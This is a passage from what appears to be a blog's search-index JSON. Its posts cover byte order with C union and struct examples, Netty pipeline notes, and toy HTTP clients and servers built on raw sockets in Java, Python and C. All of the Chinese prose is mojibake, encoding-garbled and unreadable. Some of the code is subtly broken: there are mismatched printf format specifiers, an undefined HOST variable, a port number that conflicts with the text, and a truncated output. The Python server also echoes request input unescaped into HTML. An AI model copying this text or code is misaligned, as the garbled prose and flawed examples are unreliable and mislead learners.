·çš„æ•°æ®ä¹Ÿåº”è¯¥è½¬æ¢å­—èŠ‚åºï¼Œå½“ç„¶å­—ç¬¦ä¸²ä¹ŸæŒºå¥½ï¼ˆè¿™å¤§æ¦‚ä¹Ÿå°±æ˜¯Jsonçš„ä¼˜åŠ¿äº†ï¼Œè€Œåƒprotobufè¿™ç§ä¼ è¾“æ—¶å°±è¦æ³¨æ„é¡ºåºï¼‰ã€‚ æŠ“åŒ…çœ‹ipåœ°å€å­—èŠ‚åºè½¬æ¢utf-8è¿˜æœ‰ä¸€ä¸ªbyte-order-mark(bom)çš„é—®é¢˜ Cè¯­è¨€ä¸‹å¯ä»¥æŠŠä¸€ä¸ªbyteæŒ‰ç…§binaryçš„æ–¹å¼æ‰“å°å‡ºæ¥(å°±æ˜¯æŠŠä¸€ä¸ªbyteçš„æ¯ä¸€ä¸ªbitè¾“å‡ºæ¥),intä¹Ÿå¯ä»¥ã€‚è¿™ä¸ªå…¶å®è·Ÿjavaçš„Integer.toBinaryStringæ˜¯ä¸€æ ·çš„ã€‚ #include &lt;stdio.h&gt; #include &lt;limits.h&gt; void print_bin(unsigned char byte) { int i = CHAR_BIT; /* however many bits are in a byte on your platform */ while(i--) { putchar(&#39;0&#39; + ((byte &gt;&gt; i) &amp; 1)); /* loop through and print the bits */ } printf(&quot;\\n\\n&quot;); } void print_bin_int(unsigned int integer) { int i = CHAR_BIT * sizeof integer; /* however many bits are in an integer */ while(i--) { putchar(&#39;0&#39; + ((integer &gt;&gt; i) &amp; 1)); } printf(&quot;\\n\\n&quot;); } int checkCPUendian() { union { unsigned int a; unsigned char b; }c; c.a = 1; printf(&quot;a = %a , b= %a \\n&quot;,c.a , c.b); printf(&quot;a = %X , b= %X \\n&quot;,c.a , c.b); printf(&quot;a = %p , b= %p \\n&quot;,c.a , c.b); printf(&quot;a = %u , b= %u \\n&quot;,c.a , c.b); print_bin(c.b); print_bin_int(c.a); return (c.b == 1); } int main(int argc, char const *argv[]) { if(checkCPUendian()){ printf(&quot;Little endian platform!\\n&quot;); } else { printf(&quot;Big Endian platform!\\n&quot;); } return 0; } è¾“å‡ºï¼Œè¿™é‡Œæ˜¯ä»é«˜åœ°å€å†…å­˜å¼€å§‹å¾€ä½åœ°å€çš„å†…å­˜è¯»å– a = 0x0.07fcbc8474a98p-1022 , b= 0x0p+0 a = 1 , b= 1 a = 0x1 , b= 0x1 a = 1 , b= 1 00000001 00000000000000000000000000000001 Little endian platform! struct Test{ int flag; char str[10]; }; struct Test a; a.flag = 4096; // æœªè½¬æ¢å­—èŠ‚åº strcpy(a.str,&quot;hello&quot;); å¦‚æœé€šè¿‡cè¯­è¨€å‘é€è¿™æ ·ä¸€ä¸ªstructï¼Œåœ¨wireSharké‡Œé¢æŠ“åŒ…ï¼Œå¾—åˆ°çš„dataæ˜¯è¿™æ ·çš„(16è¿›åˆ¶ï¼Œç†è§£æˆä¸¤ä¸ªæ•°å­—ä»£è¡¨ä¸€ä¸ªbyteå°±è¡Œäº†):00 10 00 00 68 65 6c 6c 6f 00 00 00 00 00 00 00å‰å››ä¸ªbyteï¼ˆä¸€ä¸ªintå°±4byteå˜›ï¼‰å°±æ˜¯4096(åå…­è¿›åˆ¶æ˜¯00 00 10 00)ï¼Œå®é™…ä¼ çš„æ˜¯æŒ‰ç…§å°ç«¯ä¼ çš„åé¢çš„å­—ç¬¦ä¸²ï¼Œå› ä¸ºæ¯ä¸€ä¸ªcharå°±å ç”¨ä¸€ä¸ªbyteï¼Œæ‰€ä»¥ä¸å­˜åœ¨ä¸€ä»½æ•°æ®å®ä½“è·¨è¶Šå¤šä¸ªByteçš„é—®é¢˜ã€‚æ³¨æ„å®é™…å‘é€çš„byteå¤§å°æ˜¯16 bytesè€Œä¸æ˜¯ 4 + 10 ï¼ˆå› ä¸ºstructçš„sizeofæ˜¯æ‰€æœ‰æˆå‘˜åŠ åœ¨ä¸€èµ·çš„å¤§å°å†åŠ ä¸Špaddingï¼Œå°±æ˜¯å†…å­˜å¯¹é½ï¼Œç›´æ¥8çš„å€æ•°ã€‚unionåˆ™æ˜¯æ‰€æœ‰å˜é‡ä¸­æœ€å¤§çš„é‚£ä¸€ä¸ªåŠ ä¸Špaddingï¼‰ #include &lt;stdio.h&gt; union Data{ char ch; short sh; int n; } data; int main(){ data.ch = 0x65; printf(&quot;%#x, %#x, %#x\\n&quot;, data.ch, data.sh, data.n); data.ch = 0x12345678; printf(&quot;%#x, %#x, %#x\\n&quot;, data.ch, data.sh, data.n); data.sh = 0x87654321; printf(&quot;%#x, %#x, %#x\\n&quot;, data.ch, data.sh, data.n); data.n = 0x87654321; printf(&quot;%#x, %#x, %#x\\n&quot;, data.ch, data.sh, data.n); return 0; } 0x65, 0x65, 0x650x78, 0x78, 0x780x21, 0x4321, 0x43210x21, 0x4321, 0x87654 é«˜ä½çš„æ•°æ®è¢«æŠ¹æ‰äº†ï¼Œæ‰€ä»¥0x12345678 åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼å…¶å®æ˜¯ 78 56 34 12 å‚è€ƒlinuxä¸€ç«™å¼å­¦ä¹ ","tags":[]},{"title":"è¯»ç‰©","date":"2018-10-28T21:43:40.000Z","path":"2018/10/28/2018-10-28-idea-for-good-reading/","text":"å¥½çš„åšå®¢ï¼Œå¥½çš„æ–‡ç« çš„æ”¶è—å¤¹ Linux Cç¼–ç¨‹ä¸€ç«™å¼å­¦ä¹  author of nettyæ­»ç£•javaæŠ€æœ¯å°é»‘å±‹Jerry Qu ä¸“æ³¨ WEB ç«¯å¼€å‘ éå¸¸éå¸¸å…¨çš„å…³äºpython socketç¼–ç¨‹çš„æ–‡ç« ï¼Œæ–‡ç« æœ¬èº«ä¹Ÿå¾ˆé•¿ å…³äºcè¯­è¨€å†™çš„å¾ˆå¥½çš„åšå®¢å…³äºç½‘ç»œåŸºæœ¬åŠŸçš„ how hackers start their afternoons. å¾ˆåƒmediumçš„ä¸€ä¸ªç½‘ç«™ Linux ä¿¡å·å¤„ç† icymind å…³äºlinuxçš„ä»»ä½•äº‹jvm,javaæŠ€æœ¯ç›¸å…³çš„tcpè¿›é˜¶è„šæœ¬è¯­è¨€çš„ä¸­å˜é‡ä½œç”¨åŸŸé—®é¢˜Andriodç³»ç»Ÿçš„æ–‡ç« å†™å¾—å¾ˆæ·± å„ç§æŠ€æœ¯è¯é¢˜çš„blog æ¥æµ‹è¯•ä¸‹ä½ çš„Javaç¼–ç¨‹èƒ½åŠ› guava ,apache common pool blog of jake Wharton å…³äºgoè¯­è¨€ä»¥åŠlinux kernelçš„å‚æ•°","tags":[{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"nettyçŸ¥è¯†æ‰‹å†Œ","date":"2018-10-13T21:34:19.000Z","path":"2018/10/13/2018-10-13-netty-and-related-intro/","text":"éƒ½è¯´nettyè¦æ¯”nioå¥½ç”¨ï¼Œå…ˆä»å®˜æ–¹çš„intro pageçœ‹èµ·ã€‚ ByteBuffæ˜¯reference countedçš„ï¼Œnettyçš„ä½œè€…è¯´ï¼šjavaç»™äººä¸€ç§ä¸éœ€è¦æ¸…ç†garbageçš„illusionallocating stuff is no big deal , garbage collecting it is. netty 5è¦æ±‚æœ€ä½jdk11 ï¼Œæ‰€ä»¥æš‚æ—¶ç”¨netty 4.1æ¥å­¦ä¹ è¿˜æ˜¯okçš„ã€‚ tcpç²˜åŒ…çš„å¤„ç†æ–¹å¼zero copyä¸CompositeBytebufnettyå¤„ç†udpä¹Ÿæ˜¯å¯ä»¥çš„nettyé€šè¿‡jniæ‰©å±•äº†ä¸€äº›jdkä¸­ä¸å­˜åœ¨çš„åŠŸèƒ½ç”¨äºè°ƒç”¨ç³»ç»Ÿæ–¹æ³•ChannelPipeline æ˜¯ä¸€è¿ä¸²å¤„ç†eventsçš„handlerçš„é›†åˆï¼Œé€šå¸¸ä¼šæœ‰åŒ…æ‹¬decoder(å°†Bytesè½¬æ¢æˆjava object)ï¼Œä¸šåŠ¡é€»è¾‘å¤„ç†ï¼Œ encoder(å°†java objectè½¬æˆbytes)ã€‚å¦‚æœä¸šåŠ¡å¤„ç†è€—æ—¶æ¯”è¾ƒå¤šçš„è¯ï¼Œå¯ä»¥å°†ä¸šåŠ¡é€»è¾‘ä»£ç æŒªåˆ°ioçº¿ç¨‹ä»¥å¤– static final EventExecutorGroup group = new DefaultEventExecutorGroup(16); ... ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(&quot;decoder&quot;, new MyProtocolDecoder()); pipeline.addLast(&quot;encoder&quot;, new MyProtocolEncoder()); // Tell the pipeline to run MyBusinessLogicHandler&#39;s event handler methods // in a different thread than an I/O thread so that the I/O thread is not blocked by // a time-consuming task. // If your business logic is fully asynchronous or finished very quickly, you don&#39;t // need to specify a group. pipeline.addLast(group, &quot;handler&quot;, new MyBusinessLogicHandler()); //è¿™æ ·åœ¨businessHandleré‡Œé¢å°±èƒ½å¤„ç†blockingä¸šåŠ¡ï¼Œæ¯”å¦‚æ“ä½œsql, æˆ–è€…ã€‚ã€‚ã€‚è°ƒç”¨ä¸€ä¸ªrpc? @ChannelHandler.Sharableè¿™ä¸ªæ³¨è§£æ¯ä¸€ä¸ªChanneléƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„businessHandlerï¼Œå› ä¸ºè¿™é‡Œç‰µæ¶‰åˆ°äº†stateç›¸å…³çš„ä¸œè¥¿è€Œæœ‰äº›Decoderå’ŒEncoderæ˜¯ä¸å…·å¤‡stateçš„ï¼Œè¿™ç§å°±è¢«æ·»åŠ äº†@Sharableçš„æ³¨è§£ã€‚æœ€å¸¸ç”¨çš„httpç›¸å…³çš„decoderå’Œencoderå¹¶æ²¡æœ‰æ·»åŠ è¿™ä¸ªæ³¨è§£ï¼ŒåŸå› åœ¨ io.netty.handler.codec.http.HttpObjectDecoderè¿™ä¸ªclassé‡Œé¢ï¼Œæ˜¯æœ‰ä¸€ä¸ªcurrentStateçš„ã€‚å‡å¦‚é‡åˆ°äº†chunkedè¿™ç§ï¼Œdecoderä¸å¯èƒ½ä¸€æ¬¡è¯»å®Œï¼Œé‚£ä¹ˆæ¯ä¸€ä¸ªhttpè¯·æ±‚(èƒŒåçš„channelï¼Œconnection)éƒ½åº”è¯¥ä¿ç•™ä¸€ä¸ªä¹‹å‰æ›¾ç»è¯»è¿‡çš„éƒ¨åˆ†ã€‚è‡ªç„¶è¿™ä¸ªhandlerå°±å˜æˆäº†statefulçš„äº†ã€‚ nettyçš„ä½œè€…åœ¨æ¼”è®²ä¸­æåˆ°javaå®˜æ–¹çš„nioå¹¶ä¸ç‰¹åˆ«å¥½ï¼Œæ‰€ä»¥ï¼Œç”Ÿäº§ç¯å¢ƒç”¨çš„éƒ½æ˜¯nettyè¿™ç§ã€‚ Vertxï¼Œæ˜¯ä¸€ä¸ªåŸºäºJVMã€è½»é‡çº§ã€é«˜æ€§èƒ½çš„åº”ç”¨å¹³å°ï¼Œéå¸¸é€‚ç”¨äºç§»åŠ¨ç«¯åå°ã€äº’è”ç½‘ã€ä¼ä¸šåº”ç”¨æ¶æ„ã€‚vertxæ¡†æ¶åº•å±‚åŸºäºnettyï¼Œä¹Ÿæ˜¯å¼‚æ­¥ioï¼Œselectoré‚£ä¸€å¥—(vertxåŸºäºnetty) nettyçš„exampleéå¸¸å¤šï¼Œhttp2,cors,uploadç­‰ç­‰éƒ½æœ‰ Netty - One Framework to rule them all by Norman Maurernetty best practices with norman maurernettyè§„é¿äº†java nioçš„ä¸€ä¸ªbug,å…³äºè¿™ä¸ªjdkå¯¼è‡´cpu100%çš„bugçš„è®¨è®ºå¾ˆå¤š","tags":[{"name":"nio","slug":"nio","permalink":"https://haldir65.github.io/tags/nio/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"ä»Socketå…¥æ‰‹å®ç°httpåè®®","date":"2018-10-13T21:30:36.000Z","path":"2018/10/13/2018-10-13-implementing-http-server-via-socket/","text":"æ”¶é›†å‡ ç§è¯­è¨€ä¸­ä½¿ç”¨socketå®ç°httpServerå’ŒhttpClientçš„ä¸»è¦æ­¥éª¤ OSIä¸ƒå±‚ç½‘ç»œä½“ç³»ç»“æ„ ï¼š ç‰©ç†å±‚(IEEE 802.2)ã€æ•°æ®é“¾è·¯å±‚(ARP,RARP)ã€ç½‘ç»œå±‚(ip,icmp)ã€ä¼ è¾“å±‚(tcp,udp)ã€è¡¨ç¤ºå±‚ã€ä¼šè¯å±‚(SSL,TLS)ã€åº”ç”¨å±‚(HTTP,FTP,SMTP,POP3).è¿™é‡Œé¢Socketæ¯”è¾ƒç‰¹æ®Šï¼ŒSocketæ˜¯ä¸€ç»„ç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰ã€‚ä»‹äºä¼ è¾“å±‚å’Œåº”ç”¨å±‚ï¼Œå‘åº”ç”¨å±‚æä¾›ç»Ÿä¸€çš„ç¼–ç¨‹æ¥å£ã€‚åº”ç”¨å±‚ä¸å¿…äº†è§£TCP/IPåè®®ç»†èŠ‚,ç›´æ¥é€šè¿‡å¯¹Socketæ¥å£å‡½æ•°çš„è°ƒç”¨å®Œæˆæ•°æ®åœ¨IPç½‘ç»œçš„ä¼ è¾“ã€‚SOCKET ç®—ä¸ä¸Šæ˜¯ä¸ªåè®®ï¼Œåº”è¯¥æ˜¯åº”ç”¨å±‚ä¸ä¼ è¾“å±‚é—´çš„ä¸€ä¸ªæŠ½è±¡å±‚ï¼Œæ˜¯ä¸ªç¼–ç¨‹æ¥å£ã€‚ tcpåŒ…ç»“æ„æ˜¯ä¸åŒ…å«ipåœ°å€çš„ï¼Œåªæœ‰source port(2ä¸ªbyte)å’Œdestination port(65536è¿™ä¹ˆæ¥çš„)çš„. ip addressæ˜¯ipå±‚çš„å·¥ä½œã€‚ HTTP 1.1çš„RFCéå¸¸é•¿ åœ¨ OSI çš„ä¸ƒå±‚åè®®ä¸­ï¼Œç¬¬äºŒå±‚ï¼ˆæ•°æ®é“¾è·¯å±‚ï¼‰çš„æ•°æ®å«ã€ŒFrameã€ï¼Œç¬¬ä¸‰å±‚ï¼ˆç½‘ç»œå±‚ï¼‰ä¸Šçš„æ•°æ®å«ã€ŒPacketã€ï¼Œç¬¬å››å±‚ï¼ˆä¼ è¾“å±‚ï¼‰çš„æ•°æ®å«ã€ŒSegmentã€ã€‚(åœ¨wireSharkçš„æŠ“åŒ…ç»“æœå°±æ˜¯è¿™ä¹ˆå±•ç¤ºçš„) tcpåŒ…ç»“æ„ï¼Œudpçš„ä¹Ÿæœ‰ javaç”¨javaå®ç°ä¸€ä¸ªhttpclientæ€ä¹ˆæ ·? public class HttpSocketClient { private Socket mSocket; public static void main(String[] args) { HttpSocketClient client = new HttpSocketClient(); try { client.sendGet(&quot;www.baidu.com&quot;,80,&quot;/&quot;); } catch (IOException e) { e.printStackTrace(); } } public HttpSocketClient() { this.mSocket = new Socket(); } /** åœ¨ç™¾åº¦æœåŠ¡å™¨é¢å‰ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æµè§ˆå™¨ * @param host * @param port * @param path * @throws IOException */ void sendGet(String host, int port, String path) throws IOException { SocketAddress dest = new InetSocketAddress(host, port); mSocket.connect(dest); OutputStreamWriter streamWriter = new OutputStreamWriter(mSocket.getOutputStream()); BufferedWriter bufferedWriter = new BufferedWriter(streamWriter); bufferedWriter.write(&quot;GET &quot; + path + &quot; HTTP/1.1\\r\\n&quot;); bufferedWriter.write(&quot;Host: &quot; + host + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;Connection: &quot; + &quot;keep-alive&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;User-Agent: &quot; + &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;Accept: &quot; + &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;Accept-Language: &quot; + &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot; + &quot;\\r\\n&quot;); bufferedWriter.write(&quot;\\r\\n&quot;); bufferedWriter.flush(); //flushä¸€ä¸‹å¾ˆé‡è¦ï¼Œç­‰äºè¯´å·²ç»å†™å®Œäº† BufferedInputStream stream = new BufferedInputStream(mSocket.getInputStream()); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream)); String line = null; while ((line = bufferedReader.readLine())!=null) { System.out.println(line); } bufferedReader.close(); bufferedWriter.close(); mSocket.close(); } } è¾“å‡º HTTP/1.1 302 Moved Temporarily Date: Sat, 24 Mar 2018 06:44:20 GMT Content-Type: text/html Content-Length: 225 Connection: Keep-Alive Set-Cookie: BAIDUID=259D5F393E329E8E44651C589037C093:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com Set-Cookie: BIDUPSID=259D5F393E329E8E44651C589037C093; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com Set-Cookie: PSTM=1521873860; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com Set-Cookie: BD_LAST_QID=10107339987852007720; path=/; Max-Age=1 P3P: CP=&quot; OTI DSP COR IVA OUR IND COM &quot; Location: https://www.baidu.com/ Server: BWS/1.1 X-UA-Compatible: IE=Edge,chrome=1 &lt;html&gt; &lt;head&gt;&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor=&quot;white&quot;&gt; &lt;center&gt;&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;65d90fa34a5e777be72b3e20c859c335f9198cc2 Time : Thu Mar 15 16:20:59 CST 2018&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; å½“ç„¶å› ä¸ºè®¿é—®çš„æ˜¯httpï¼Œ302æ˜¯ä¸´æ—¶é‡å®šå‘ï¼ˆå¦å¤–ï¼Œå‡ ä¹æ²¡è§è¿‡è°è¿”å›301çš„ï¼Œ301çš„ç»“æœä¼šè¢«æµè§ˆå™¨ç¼“å­˜ï¼‰ï¼Œæ³¨æ„ä¸Šé¢è¿”å›äº†Locationå­—æ®µï¼Œæ‰€ä»¥æ˜¯ç¬¦åˆè§„èŒƒçš„ serverè¿™è¾¹æ™®éç”¨çš„æ˜¯nettyï¼Œæ­£å¥½nettyçš„å®˜ç½‘ä¸Šä¹Ÿæœ‰ç›¸å…³çš„æ•™ç¨‹.nettyçš„exampleéå¸¸å¤šï¼Œhttp2,cors,uploadç­‰ç­‰éƒ½æœ‰ Pythonæˆ‘è‡ªå·±æŠ„æ¥çš„ç®€æ˜“ç‰ˆ ## server import socket import re import os import codecs,logging sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.bind((HOST, 18004)) sock.listen(100) # infinite loop while True: # maximum number of requests waiting conn, addr = sock.accept() request = conn.recv(1024) if isinstance(request,bytes): request = str(request) logging.error(request) splited = request.split(&#39; &#39;) if(len(splited)&lt;2): continue method = request.split(&#39; &#39;)[0] src = request.split(&#39; &#39;)[1] print(&#39;Connect by: &#39;, addr) print(&#39;Request is:\\n&#39;, request) # deal wiht GET method if method == &#39;GET&#39; or method.__contains__(&#39;GET&#39;): if src == &#39;/index.html&#39;: content = index_content elif src == &#39;/image/image_12.jpg&#39;: content = pic_content elif src == &#39;/reg.html&#39;: content = reg_content elif re.match(&#39;^/\\?.*$&#39;, src): entry = src.split(&#39;?&#39;)[1] # main content of the request content = &#39;HTTP/1.x 200 ok\\r\\nContent-Type: text/html\\r\\n\\r\\n&#39; content += entry content += &#39;&lt;br /&gt;&lt;font color=&quot;green&quot; size=&quot;7&quot;&gt;register successs!&lt;/p&gt;&#39; else: continue # deal with POST method elif method == &#39;POST&#39;: form = request.split(&#39;\\r\\n&#39;) entry = form[-1] # main content of the request content = &#39;HTTP/1.x 200 ok\\r\\nContent-Type: text/html\\r\\n\\r\\n&#39; content += entry content += &#39;&lt;br /&gt;&lt;font color=&quot;green&quot; size=&quot;7&quot;&gt;register successs!&lt;/p&gt;&#39; ###### # More operations, such as put the form into database # ... ###### else: continue if(type(content) is str): content = content.encode(&#39;utf-8&#39;) conn.sendall(content) # close connection conn.close() æœ¬åœ°æµè§ˆå™¨è®¿é—®localhost:10086åº”è¯¥å°±èƒ½çœ‹åˆ°ç»“æœäº†ï¼Œå€¼å¾—ä¸€æçš„æ˜¯è‡ªå·±åœ¨chromeé‡Œé¢è®¿é—®â€http://localhost:18004/index.html&quot;è¿™ä¸ªåœ°å€çš„æ—¶å€™ï¼Œäº‹å®ä¸Šæµè§ˆå™¨å‘é€çš„æ•°æ®æ˜¯è¿™æ ·çš„ bâ€™GET /index.html HTTP/1.1\\r\\nHost: localhost:18004\\r\\nConnection: keep-alive\\r\\nCache-Control: max-age=0\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\\r\\nDNT: 1\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\\r\\nCookie: _ga=GA1.1.dsadsa.dsadas; _gid=GA1.1.dsadsa.dsadasda\\r\\n\\r\\nâ€™ å¯¹äº†ï¼Œæµè§ˆå™¨é»˜è®¤ä¼šè¯·æ±‚faviconï¼Œæ‰€ä»¥åœ¨æœåŠ¡å™¨è¿™è¾¹çœ‹åˆ°äº†å¦ä¸€ä¸ªè¯·æ±‚ bâ€™GET /favicon.ico HTTP/1.1\\r\\nHost: localhost:18004\\r\\nConnection: keep-alive\\r\\nPragma: no-cache\\r\\nCache-Control: no-cache\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\\r\\nDNT: 1\\r\\nAccept: image/webp,image/apng,image/,/*;q=0.8\\r\\nReferer: http://localhost:18004/index.html\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\\r\\nCookie: _ga=GA1.1.dsadsa.dsadas; _gid=GA1.1.dsadsa.dsadasda\\r\\n\\r\\nâ€™ å¹³æ—¶ç”¨çš„éƒ½æ˜¯requestsè¿™ä¸ªåº“,ä¸è¿‡è‡ªå·±å†™ä¹Ÿè¿˜æ˜¯å¾ˆç®€å• #!/usr/bin/python # -*- coding: UTF-8 -*- # å¯¼å…¥socketåº“: import socket # åˆ›å»ºä¸€ä¸ªsocket: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # å»ºç«‹è¿æ¥: s.connect((&#39;www.sina.com.cn&#39;, 80)) s.send(b&#39;GET / HTTP/1.1\\r\\nHost: www.sina.com.cn\\r\\nConnection: close\\r\\n\\r\\n&#39;) # æ¥æ”¶æ•°æ®: buffer = [] while True: # æ¯æ¬¡æœ€å¤šæ¥æ”¶1kå­—èŠ‚: d = s.recv(1024) if d: buffer.append(d) else: break data = b&#39;&#39;.join(buffer) s.close() header, html = data.split(b&#39;\\r\\n\\r\\n&#39;, 1) print(header.decode(&#39;utf-8&#39;)) # æŠŠæ¥æ”¶çš„æ•°æ®å†™å…¥æ–‡ä»¶: with open(&#39;sina.html&#39;, &#39;wb&#39;) as f: f.write(html) ä¸Šè¿°ä»£ç ï¼Œserverå’Œclientéƒ½ä¸èƒ½å¾ˆå¥½çš„å¤„ç†å¹¶å‘æˆ–è€…åˆ©ç”¨å¤šè¿›ç¨‹ é«˜é˜¶ç‰ˆ è‡ªå·±ç”¨selectorå®ç°äº†ä¸€ä¸ªtoy serverï¼Œä½¿ç”¨curlå¯ä»¥åƒè¯·æ±‚ä¸€ä¸ªæœ¬åœ°æœåŠ¡ä¸€æ ·å»è·å¾—response sudo python3 src/_045_realpython_socket_article/dumbHttpServer.py 127.0.0.1 80 å®Œæˆçš„åœ°æ–¹åŒ…æ‹¬: serveræ³¨å†Œsocket non-blockingç›‘å¬ã€‚æœ‰æ–°çš„clientè¿æ¥ä¸Šå°±æŠŠclient socketåŠ å…¥selectorç›‘å¬ã€‚ åœ¨å‡ºç°EventReadä¹‹åä½¿ç”¨socket.recv()è¯»å–è¯·æ±‚ï¼ˆGET /index.html http/1.1 â€¦.ï¼‰ï¼ŒæŠŠâ€index.htmlâ€è¿™æ ·çš„pathåŠ å…¥data åœ¨å‡ºç°EventWriteä¹‹åï¼Œä»dataä¸­è·å–ä¹‹å‰çš„pathï¼ˆå®é™…ä¸­å¯ä»¥æ ¹æ®è¿™ä¸ªpathå»æ‰¾æœåŠ¡æˆ–è€…æ–‡ä»¶èµ„æºï¼‰ï¼Œè¿”å›utf-8 encodedå†…å®¹ï¼Œå¤–åŠ http response header (socket.sendall). ä¸»è¦çš„ç¼ºé™·åŒ…æ‹¬: clientè¿™è¾¹ctrl+cä¹‹åï¼Œserverè¿™è¾¹ä¼šæ¥æ”¶åˆ°ä¸€ä¸ª13çš„ä¿¡å·ï¼Œé»˜è®¤å¯¹è¿™ä¸ªä¿¡å·çš„å¤„ç†æ˜¯æ€è¿›ç¨‹ åœ¨sendæˆ–è€…readçš„æ—¶å€™æœ‰å¯èƒ½å‡ºç°BrokenPipeErroræˆ–è€…ConnectionResetErrorã€‚æš‚æ—¶åªå¥½åˆ°å¤„try except. è‡ªå·±ç”¨socketä¼ªé€ httpåè®®çš„content-lengthå­—æ®µæ˜¯èƒ½å¤Ÿè¢«wgetè®¤å¯çš„ï¼Œåªæ˜¯è¿™ä¸ªcontent-length = len(æ­£æ–‡.encode(â€˜utf-8â€™))ã€‚å°±æ˜¯è¿™éƒ¨åˆ†é•¿åº¦æ˜¯å­—èŠ‚æ•°ç»„çš„é•¿åº¦ï¼Œå¦åˆ™ä¼šçŸ­ä¸€äº›ã€‚ http responseåè®®å¤´å­—æ®µä¹‹é—´åŠ (\\r\\n headeræœ€åè·Ÿä¸¤ä¸ªæ¢è¡Œç¬¦) è¿™äº›éƒ½æ˜¯å¿…è¦çš„ curlä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨è¯»å®Œresponseä¹‹åè¿˜å¡åœ¨é‚£é‡Œï¼ˆé™¤éserverä¸»åŠ¨closeæ‰socketï¼‰ wrkè·‘åˆ†çœ‹ä¸å‡ºæ¥è¿™ä¸ªtoy serverçš„ååé‡ã€‚ Cè¯­è¨€ç‰ˆæœ¬Cè¯­è¨€çš„åº”è¯¥æœ€æ¥è¿‘åº•å±‚,Cè¯­è¨€å®ç°HTTPçš„GETå’ŒPOSTè¯·æ±‚ä¼¼ä¹æœ‰å¾ˆå¤šç°æˆçš„ä¾‹å­å¯ä»¥ç›´æ¥æ‹¿æ¥æŠ„ç»å…¸çš„tinyhttpd,ä¸åˆ°500è¡Œ ç®€å•ç‰ˆæœ¬çš„å‚è€ƒä½¿ç”¨Linux cè¯­è¨€ç¼–å†™ç®€å•çš„webæœåŠ¡å™¨socket httpæ–‡ä»¶ä¸‹è½½å™¨cè¯­è¨€å®ç° é«˜é˜¶ç‰ˆæœ¬çš„å‚è€ƒé«˜é˜¶ä¸€ç‚¹ï¼Œå¤„ç†å¹¶å‘çš„å¤šçº¿ç¨‹çš„serverå’Œclientæºç  ä¸€ä¸ªç®€å•çš„httpServer.c(unixç¯å¢ƒä¸‹è¿è¡Œ) #include &lt;stdio.h&gt; #include &lt;netinet/in.h&gt; #include &lt;sys/socket.h&gt; // socket #include &lt;sys/types.h&gt; // åŸºæœ¬æ•°æ®ç±»å‹ #include &lt;unistd.h&gt; // read write #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // open close #include &lt;sys/shm.h&gt; #include &lt;signal.h&gt; #define PORT 8888 #define SERV &quot;0.0.0.0&quot; #define QUEUE 20 #define BUFF_SIZE 1024 typedef struct doc_type{ char *key; char *value; }HTTP_CONTENT_TYPE; HTTP_CONTENT_TYPE http_content_type[] = { { &quot;html&quot;,&quot;text/html&quot; }, { &quot;gif&quot; ,&quot;image/gif&quot; }, { &quot;jpeg&quot;,&quot;image/jpeg&quot; } }; int sockfd; char *http_res_tmpl = &quot;HTTP/1.1 200 OK\\r\\n&quot; &quot;Server: Cleey&#39;s Server V1.0\\r\\n&quot; &quot;Accept-Ranges: bytes\\r\\n&quot; &quot;Content-Length: %d\\r\\n&quot; &quot;Connection: close\\r\\n&quot; &quot;Content-Type: %s\\r\\n\\r\\n&quot;; void handle_signal(int sign); // é€€å‡ºä¿¡å·å¤„ç† void http_send(int sock,char *content); // http å‘é€ç›¸åº”æŠ¥æ–‡ char* joinString(char *s1, char *s2);//å­—ç¬¦ä¸²æ‹¼æ¥ int main(int argc,char *argv[ ]){ signal(SIGINT,handle_signal); int count = 0; // è®¡æ•° // å®šä¹‰ socket sockfd = socket(AF_INET,SOCK_STREAM,0); // å®šä¹‰ sockaddr_in struct sockaddr_in skaddr; skaddr.sin_family = AF_INET; // ipv4 skaddr.sin_port = htons(PORT); skaddr.sin_addr.s_addr = inet_addr(SERV); // bindï¼Œç»‘å®š socket å’Œ sockaddr_in if( bind(sockfd,(struct sockaddr *)&amp;skaddr,sizeof(skaddr)) == -1 ){ perror(&quot;bind error&quot;); exit(1); } // 